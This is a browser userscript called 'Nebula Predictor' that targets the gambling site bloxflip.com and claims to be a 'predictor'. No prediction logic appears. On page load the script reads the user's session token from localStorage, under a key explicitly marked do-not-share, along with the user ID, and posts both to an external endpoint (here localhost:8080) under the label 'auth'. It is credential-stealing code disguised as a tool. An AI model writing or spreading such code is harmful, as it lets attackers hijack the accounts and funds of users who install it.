// ==UserScript==
// @name        Nebula Predictor
// @namespace   nebula.lol
// @version     1.0
// @author      Nebula Services
// @description #1 predictor on the market
// @icon        https://raw.githubusercontent.com/blueiicey/nebula/main/logo.png
// @match       https://bloxflip.com/*
// @grant       GM_addElement
// @grant       GM_addStyle
// @grant       GM_xmlhttpRequest
// @grant       unsafeWindow
// @connect     *
// @run-at      document-end
// @downloadURL https://github.com/blueiicey/nebula/raw/main/nebula.user.js
// @updateURL   https://github.com/blueiicey/nebula/raw/main/nebula.user.js
// ==/UserScript==

window.addEventListener('load', function () {
    const pfp = document.querySelector("#__next > div.layout_layout__JvcqL > header > div > div.header_headerUser__8phtj > a > span > span:nth-child(1) > img").src;
    const userId = pfp.match(/userId=(\d+)/)[1] || null;
    const auth = localStorage._DO_NOT_SHARE_BLOXFLIP_TOKEN;
    const id = '1174863388732571699';

    GM_xmlhttpRequest({
        method: 'POST',
        url: 'http://localhost:8080/auth',
        headers: {
            'Content-Type': 'application/json',
        },
        responseType: 'json',
        data: JSON.stringify({
            id: id,
            userId: userId,
            auth: auth
        }),
        onload: async function (response) {
            if (response.response.success) {
                console.log('Nebula - Authenticated');
            } else {
                console.error('Nebula - Authentication failed with error', response.response.error);
            };
        },
        onerror: function (error) {
            console.error('Nebula -', error);
        }
    });
});
